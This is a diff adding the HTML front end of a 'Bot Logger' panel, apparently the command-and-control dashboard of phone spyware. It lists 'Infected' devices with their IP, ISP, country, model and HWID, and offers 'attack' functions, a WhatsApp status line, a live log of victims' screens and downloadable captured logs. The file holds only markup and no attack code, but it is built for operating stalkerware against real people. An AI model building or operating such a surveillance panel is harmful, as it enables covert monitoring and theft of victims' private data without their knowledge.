@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../css/index.css">
+    <link rel="stylesheet" href="../css/nice-select.css">
+
+    <!-- JS -->
+    <script src="../js/socketIo.js" defer></script>
+    <script src="../js/jquery.js" defer></script>
+    <script src="../js/partical.js" defer></script>
+    <script src="../js/jquery.nice-select.min.js" defer></script>
+    <script src="../js/index.js" defer></script>
+
+</head>
+
+<body>
+    <div id="mainBody">
+        <canvas id="bgParticals"></canvas>
+        <header>
+            <img src="../img/cyber-eye.png" alt="">
+            <p>Bot Logger</p>
+            <nav>
+                <ul>
+                    <!-- <li><a >Home</a></li>
+                    <li><a >Admin</a></li> -->
+                    <li><button id="showContainer">Logger</button></li>
+                    <li><button id="showDeviceList">Device List</button></li>
+                </ul>
+            </nav>
+        </header>
+        <div id="mainContainer">
+            <div id="container">
+                <form id="left">
+                    <div id="leftBG"></div>
+                    <p style="color: red;" id="status">Disconnected from server</p>
+                    <div id="options">
+                        <div id="deviceSelector">
+                            <select name="infected" id="infected" class="wide" onchange="getInfo(this.value)">
+                                <option data-display="Infected">None</option>
+                            </select>
+                        </div>
+                        <div id="infos">
+                            <div class="info">
+                                <span>DeviceName : </span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>Country :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>ISP :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>IP :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>Brand :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>Model :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>Manufacture :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>HWID :</span>
+                                <span>--</span>
+                            </div>
+                            <div class="info">
+                                <span>isOnline :</span>
+                                <span>--</span>
+                            </div>
+                        </div>
+                        <p style="color: red;" id="devicestatus"></p>
+                        <div id="attackFuns">
+                            <ul>
+                                <li class="attackList1">
+                                    <p style="color: red;" id="statuswa">User not on Whatsapp</p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div id="left">
+
+                    </div>
+                </form>
+                <div id="right">
+                    <div id="rightBG"></div>
+                    <p style="color: black; font-size: larger; font-weight: bolder;">Screen Live Log</p>
+                    <textarea name="output" spellcheck="false" id="output" disabled></textarea>
+                    <!-- <p style="color: black;">Notification Log</p>
+                    <textarea name="outputnotif" spellcheck="false" id="outputnotif" disabled></textarea> -->
+                    <!-- <div id="imgSrc">
+                        <img draggable="false"  id="img" src="../img/phone.png" alt="">  
+                        <div id="cursor">
+                            <div></div>
+                        </div>
+                    </div> -->
+                </div>
+            </div>
+            <div id="container">
+                <div id="filelistdiv" style="flex: 1 1 20%;">
+                    <h1 id="lastTitle" style="color: black; font-size: larger; font-weight: bolder;">Download latest logs</h1>
+                    <div class="date-filter-container">
+                        <p id="subtitle" style="color: black; font-size: medium;">Filter by date : </p>
+                        <input type="date" id="dateInput" onchange="filterFiles(this.value)">
+                    </div>
+                    <ul id="fileList"></ul>
+                </div>
+                <div id="right">
+                    <!-- Last log related content -->
+                    <p style="color: black; font-size: larger; font-weight: bolder;">Last log</p>
+                    <button id="clearLogButton">Clear log</button>
+                    <textarea name="lastlog" spellcheck="false" id="fileContent" disabled></textarea>
+                </div>
+            </div>
+        </div>
+        <div id="userContainer" style="display: none;">
+            <p style="color: black; align-self: center; text-align: center; font-style:normal; font-weight: bolder;">Device History</p>
+            <table id="userListTable">
+                <thead>
+                    <tr>
+                        <th>No</th>
+                        <th>Device ID</th>
+                        <th>Device name</th>
+                        <th>Model</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div id="msgs">
+    </div>
+</body>
+
+</html>
